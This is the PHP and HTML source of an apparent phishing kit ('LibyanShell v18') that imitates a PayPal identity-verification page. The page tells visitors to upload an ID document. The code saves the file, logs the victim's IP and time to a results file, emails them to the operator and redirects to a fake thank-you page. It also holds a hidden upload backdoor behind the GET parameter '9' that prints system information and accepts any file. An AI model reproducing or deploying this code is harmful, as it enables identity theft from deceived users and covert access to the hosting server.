<?php



@session_start();
/*$fillee = $_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'];

$urls = str_replace('index.php' ,  'up' , $fillee);

$path = @$_FILES['upload']['tmp_name'];
$name = @$_FILES['upload']['name'];
$size = @$_FILES['upload']['size'];
$type = @$_FILES['upload']['type'];
$error = @$_FILES['upload']['error'];

if ($_POST['sumbit']) {
   move_uploaded_file($path, $fillee.$name);
}

echo $urls . "/" .$name;*/

$fillee = $_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'];

$urls = str_replace('index.php' , 'up' , $fillee);

$target_dir = "up/";
$target_file = $target_dir . @basename($_FILES["upload"]["name"]);
$uploadOk = 1;
$imageFileType = pathinfo($target_file,PATHINFO_EXTENSION);
// form upload cart id
if(isset($_GET['9'])){echo '<b><br><br>'.php_uname().'<br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( @$_POST['_upl'] == "Upload" ) {   if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b> \\</b><br><br>'; }   else { echo '<b></b><br><br>'; } }
}
// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
    $check = getimagesize($_FILES["upload"]["tmp_name"]);
    if($check !== false) {
        /*echo "File is an image - " . $check["mime"] . ".";*/
        $uploadOk = 1;
    } else {
        //echo "File is not an image.";
        $uploadOk = 0;
    }
}
// Check if file already exists
if (file_exists($target_file)) {
    //echo "Sorry, file already exists.";
    $uploadOk = 0;
}
// Check file size
if (@$_FILES["upload"]["size"] > 500000) {
    //echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg"
&& $imageFileType != "gif" ) {
    //echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    // echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["upload"]["tmp_name"], $target_file)) {

$lein_cart_id  = $urls . '/' . $_FILES["upload"]["name"];
$ip = getenv("REMOTE_ADDR");
$time = date('l jS \of F Y h:i:s A');
$wiz = "^_^";
$rand = md5(microtime());
$useragent = $_SERVER['HTTP_USER_AGENT'];
$subject  = " Cart ID  -  [ " .$ip. " - " .$wiz. " ] ";
$headers .= "From: ^__Ruzlt__^" . "\r\n";

$message = "

################### LibyanShell v18 ###########################

Link Cart ID         =>   ".$lein_cart_id."

IP                   =>   "."http://www.geoiptool.com/?IP=".$ip."
TIME                 =>    ".$time."

################### LibyanShell v18 ############################
";

$txt = fopen('../../rezlt.txt', 'a');
fwrite($txt, $message);
fclose($txt);
@include('../boot.php');
@include('../antibots.php');
@include('../send/email.php');
mail($yourmail, $subject, $message , $headers);

 header("location:../thanx.php?websrc=".md5('W-moustache')."&dispatched=".rand(20,300)."&id=".rand(10000000000,500000000)." ");


         /*
         send cart ID 
         */
    } else {
        //echo "Sorry, there was an error uploading your file.";
    }
}

?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
        <link rel="shortcut icon" link rel="logo-icon" href="img/mou.png">
  <title>Confirm identity</title>
  <link rel="stylesheet" type="text/css" href="css/stylee.css">
  <link rel="stylesheet" type="text/css" href="../css/font-awesome.min.css">
</head>
<body>

<!--  Start NavBar Mobile   -->
   
   <div class="nav_mobile">
    <div class="menu_m">
      <a href="#">Main Menu</a>
    </div>
    <div class="logo_m">
      <a href="#">
        <img src="img/logo.svg">
      </a>
    </div>
    <div class="netif_m">
       <i class="fa fa-bell fa-lg" aria-hidden="true" style="  cursor: pointer;  font-size: 25px; color: #F5F7FA;"></i>  
      </div>
   </div>


   <!--   END NavBar Mobile   -->

   <!--  Start NavBar DeskTop   -->

   <div class="menu_desk">
      <div class="logo_d">
         <a href="#">
            <img src="img/logo.svg">
         </a>
      </div>
      <div class="all_nav">
         <ul class="list_menu">
            <li>
               <a href="#">SUMMARY</a>
            </li>
            <li>
               <a href="#">ACTIVITY</a>
            </li>
            <li>
               <a href="#">SEND & REQUEST PAYMENTS</a>
            </li>
            <li>
               <a href="#">WALLET</a>
            </li>
            <li>
               <a href="#">SHOP</a>
            </li>
         </ul>
         
      </div>
    <ul class="setting">
       <li class="no">
         <i class="fa fa-bell fa-lg" aria-hidden="true" style="  cursor: pointer;  font-size: 25px; color: #F5F7FA;"></i>
       </li> 
       <li class="no">
         <i class="fa fa-cog" aria-hidden="true" style="   cursor: pointer; font-size: 27px; color: #F5F7FA;margin-top: -6px;"></i>
       </li>
       <li>
         <button>Log Out</button>
       </li>
      </ul>
   </div>


   <!--  END NavBar DeskTop   -->

   <!--   Start Photo Victime  && Name -->

   <div class="victime">
    <div class="bil">
      <div class="img_victime">
        <img src="img/user8.png">
      </div>
      <div class="name_victime">
        <p><?php echo @$_SESSION['full_name'];?>!</p>
        <button>
          <span>Get the most out of PayPal</span>
        </button>
      </div>
    </div>
   </div>

   <!--   END Photo Victime  && Name  -->


   <div class="wrapp"> <!--   Start Wrapp   -->
    <div class="mony">
      <div class="blance">
        <a href="#">
          <span class="moustache">PayPal balance</span>
          <span class="det">Details</span>
        </a>
      </div>
      <div class="ch7al">
        <span id="anon"><img src="img/thx.png">  </span>
        <span id="anonisma">You can now transfer funds</span>
      </div>
      <ul>
        <li>
          <a href="#">Withdraw funds</a>
        </li>
        <li>
          <a href="#">Withdraw Funds using local bank</a>
        </li>
      </ul>
    </div>
      <!--  END Tbat Victime   -->

    <!--  Start Login Bank   -->


    <!-- Start Upload Cart ID-->

     <div class="moustache_anonisma">
    <div class="mia_khalifa">
        <div class="sel">
            <h2 class="raja">Confirm identity</h2>
            <div class="im_g">
            <img src="img/p11.png">
          </div>
          <div class="text">
            <p>All documents are securely stored on our private servers and will be used only in case we detect unusual activity on your account (we will ask you to re upload them to be sure that you're the real account owner ).</p>
          </div>
          
        </div>
      <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" enctype="multipart/form-data" name="form1" id="form1">
      <center>
        <div class="cas">
        <i class="fa fa-cloud-upload fa-3x" aria-hidden="true"></i>
        <span id="ch">Add document</span>
        <input type="file" name="upload" required>
        <input type="submit" name="submit" value="Continue">
      </div>
      </center>
      </form>
    </div>  
    </div>

    <!-- END Upload Cart Id -->

    <!--  Start Tbat Victime  -->

   <div class="wiz">
    <div class="up">
      <span class="update">Verification step</span>
   </div>
   <ul>
     <li class="active">
      <a href="#">
        Confirmer Your Billing
      </a>
     </li>
     <li class="active">
      <a href="#">
        Confirm The Card
      </a>
     </li>
     <li class="none">
      <a href="#">
        Verify identity
      </a>
     </li>
   </ul>
   </div>

    </div> <!--   END Wrapp   -->


  <!--  Start Footer   -->


   <footer>
      <div class="lawal">
         <a href="#">HELP & CONTACT</a>
         <a href="#">SECURITY</a>
      </div>
      <div class="tani">
         <span>Copyright ©1999-2017 PayPal. All rights reserved.</span>
         <a href="#">Privacy</a>
         <a href="#">Legal</a>
      </div>
      <div class="talat">
         <p>Consumer advisory- PayPal Pte. Ltd., the holder of PayPal’s stored value facility, does not require the approval of the Monetary Authority of Singapore. Users are advised to read the terms and conditions carefully.</p>
      </div>
   </footer>


   <!--  END Footer  -->


</body>
</html>